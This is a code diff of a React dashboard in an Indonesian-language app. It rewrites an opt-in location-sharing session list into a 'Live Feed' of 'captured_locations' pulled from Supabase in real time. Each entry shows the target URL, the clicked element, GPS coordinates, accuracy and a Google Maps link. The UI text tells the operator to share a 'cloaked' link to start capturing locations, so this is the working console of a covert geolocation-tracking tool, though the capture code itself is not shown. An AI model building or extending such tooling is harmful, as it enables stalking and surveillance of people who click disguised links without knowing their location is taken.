@@ -1,81 +1,162 @@
 
 import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { supabase } from '../services/supabaseClient';
+import { MapPin, Clock, Users, ChevronRight, LayoutDashboard, ArrowLeft, RefreshCw, Globe, MousePointer2 } from 'lucide-react';
 
 export const Dashboard: React.FC = () => {
   const navigate = useNavigate();
-  const [sessions, setSessions] = useState<any[]>([]);
+  const [captures, setCaptures] = useState<any[]>([]);
+  const [loading, setLoading] = useState(true);
 
-  useEffect(() => {
-    const data = JSON.parse(localStorage.getItem('locateMe_sessions') || '[]');
-    setSessions(data);
-  }, []);
+  const loadData = async () => {
+    setLoading(true);
+    try {
+      // Try Supabase first now that it's configured
+      const { data, error } = await supabase
+        .from('captured_locations')
+        .select('*')
+        .order('created_at', { ascending: false });
 
-  const clearHistory = () => {
-    if (confirm('Hapus semua riwayat sesi?')) {
-      localStorage.removeItem('locateMe_sessions');
-      setSessions([]);
+      if (!error && data && data.length > 0) {
+        setCaptures(data);
+        setLoading(false);
+        return;
+      }
+
+      // Fallback to local API if Supabase is empty or fails
+      const response = await fetch('/api/captures');
+      if (response.ok) {
+        const localData = await response.json();
+        setCaptures(localData || []);
+      }
+    } catch (error) {
+      console.error('Failed to load dashboard data', error);
+    } finally {
+      setLoading(false);
     }
   };
 
-  return (
-    <div className="max-w-xl mx-auto px-6 py-12">
-      <div className="flex items-center justify-between mb-8">
-        <h1 className="text-3xl font-extrabold text-slate-900 tracking-tight">Riwayat Sesi</h1>
-        {sessions.length > 0 && (
-          <button 
-            onClick={clearHistory}
-            className="text-sm text-red-500 hover:text-red-700 font-medium"
-          >
-            Hapus Semua
-          </button>
-        )}
-      </div>
+  useEffect(() => {
+    loadData();
+    
+    // Real-time subscription
+    const subscription = supabase
+      .channel('public:captured_locations')
+      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'captured_locations' }, (payload) => {
+        setCaptures(prev => [payload.new, ...prev]);
+      })
+      .subscribe();
 
-      <div className="space-y-4">
-        {sessions.length === 0 ? (
-          <div className="bg-white border border-slate-200 rounded-2xl p-12 text-center">
-            <p className="text-slate-400 mb-6">Belum ada sesi yang dibuat.</p>
+    return () => {
+      supabase.removeChannel(subscription);
+    };
+  }, []);
+
+  return (
+    <div className="min-h-screen bg-slate-50 font-sans text-slate-900">
+      {/* Header */}
+      <header className="bg-white border-b border-slate-200 sticky top-0 z-50">
+        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
+          <div className="flex items-center gap-4">
             <button 
-              onClick={() => navigate('/create')}
-              className="bg-blue-600 text-white font-bold py-3 px-8 rounded-xl"
+              onClick={() => navigate('/')}
+              className="p-2 hover:bg-slate-100 rounded-full transition-colors"
             >
-              Buat Sesi Pertama
+              <ArrowLeft className="w-5 h-5 text-slate-500" />
             </button>
+            <div className="flex items-center gap-2">
+              <div className="bg-indigo-600 p-1.5 rounded-lg">
+                <LayoutDashboard className="w-5 h-5 text-white" />
+              </div>
+              <h1 className="font-bold text-xl tracking-tight">Live Feed</h1>
+            </div>
+          </div>
+          <button 
+            onClick={loadData}
+            className="p-2 text-slate-400 hover:text-indigo-600 transition-colors"
+          >
+            <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
+          </button>
+        </div>
+      </header>
+
+      <main className="max-w-6xl mx-auto px-6 py-12">
+        {loading && captures.length === 0 ? (
+          <div className="flex flex-col items-center justify-center py-32">
+            <div className="w-12 h-12 border-4 border-indigo-600 border-t-transparent animate-spin rounded-full mb-4"></div>
+            <p className="text-slate-400 font-medium tracking-widest uppercase text-[10px] font-bold">Menghubungkan ke Supabase...</p>
           </div>
         ) : (
-          sessions.map((session) => (
-            <div 
-              key={session.id}
-              onClick={() => navigate(`/session/${session.id}`)}
-              className="bg-white border border-slate-200 rounded-2xl p-6 hover:border-blue-300 hover:shadow-md transition-all cursor-pointer group flex items-center justify-between"
-            >
-              <div className="flex-1 min-w-0">
-                <div className="flex items-center gap-2 mb-1">
-                  <h3 className="text-lg font-bold text-slate-900 truncate">{session.title}</h3>
-                  <span className={`text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider ${
-                    session.receivedLocations.length > 0 ? 'bg-green-100 text-green-700' : 'bg-slate-100 text-slate-500'
-                  }`}>
-                    {session.receivedLocations.length} Update
-                  </span>
-                </div>
-                <p className="text-sm text-slate-500">
-                  Dibuat oleh <span className="text-slate-700 font-medium">{session.creatorName}</span> • {new Date(session.createdAt).toLocaleDateString()}
-                </p>
-              </div>
-              <div className="text-slate-300 group-hover:text-blue-500 ml-4">
-                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 5l7 7-7 7" /></svg>
-              </div>
+          <div className="space-y-6">
+            <div className="flex items-center justify-between">
+              <h2 className="text-sm font-bold text-slate-400 uppercase tracking-widest">Recent Captures</h2>
+              <span className="bg-indigo-100 text-indigo-600 px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider">
+                {captures.length} Total Hits
+              </span>
             </div>
-          ))
-        )}
-      </div>
 
-      <div className="mt-8 flex justify-center">
-         <button onClick={() => navigate('/')} className="text-slate-500 font-medium hover:text-blue-600">
-          ← Kembali ke Beranda
-        </button>
-      </div>
+            {captures.length === 0 ? (
+              <div className="bg-white border border-slate-200 border-dashed rounded-[2rem] p-24 text-center">
+                <div className="w-16 h-16 bg-slate-50 rounded-2xl flex items-center justify-center mx-auto mb-6">
+                  <Globe className="w-8 h-8 text-slate-300" />
+                </div>
+                <h3 className="text-lg font-bold mb-2 text-slate-400 uppercase">Belum ada data masuk</h3>
+                <p className="text-slate-400 text-sm">Bagikan link cloaked Anda untuk mulai menangkap lokasi.</p>
+              </div>
+            ) : (
+              <div className="grid grid-cols-1 gap-4">
+                {captures.map((capture, idx) => (
+                  <div 
+                    key={capture.id || idx}
+                    className="group bg-white border border-slate-200 rounded-3xl p-6 hover:shadow-xl hover:border-indigo-100 transition-all flex flex-col md:flex-row md:items-center justify-between gap-6"
+                  >
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center gap-3 mb-3">
+                        <div className="bg-indigo-50 text-indigo-600 p-2 rounded-xl">
+                          <MapPin className="w-5 h-5" />
+                        </div>
+                        <div>
+                          <h4 className="font-bold text-lg truncate group-hover:text-indigo-600 transition-colors">
+                            {capture.target_url ? new URL(capture.target_url).hostname : 'Unknown Target'}
+                          </h4>
+                          <div className="flex items-center gap-3 text-[10px] text-slate-400 font-bold uppercase tracking-wider">
+                            <span className="flex items-center gap-1">
+                              <Clock className="w-3 h-3" />
+                              {new Date(capture.created_at || capture.timestamp).toLocaleString()}
+                            </span>
+                            <span className="flex items-center gap-1">
+                              <MousePointer2 className="w-3 h-3" />
+                              {capture.element?.text || 'Click Event'}
+                            </span>
+                          </div>
+                        </div>
+                      </div>
+                      <div className="bg-slate-50 rounded-xl p-3 border border-slate-100 text-[11px] text-slate-500 font-mono truncate">
+                        {capture.target_url}
+                      </div>
+                    </div>
+
+                    <div className="flex items-center gap-6">
+                      <div className="text-right">
+                        <div className="text-xl font-black text-slate-900">±{Math.round(capture.accuracy)}m</div>
+                        <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest text-right">Accuracy</div>
+                      </div>
+                      <a 
+                        href={`https://www.google.com/maps/search/?api=1&query=${capture.latitude},${capture.longitude}`}
+                        target="_blank" rel="noopener noreferrer"
+                        className="w-12 h-12 bg-slate-900 text-white rounded-2xl flex items-center justify-center hover:bg-indigo-600 transition-all shadow-lg shadow-slate-200"
+                      >
+                        <ChevronRight className="w-6 h-6" />
+                      </a>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
+          </div>
+        )}
+      </main>
     </div>
   );
 };
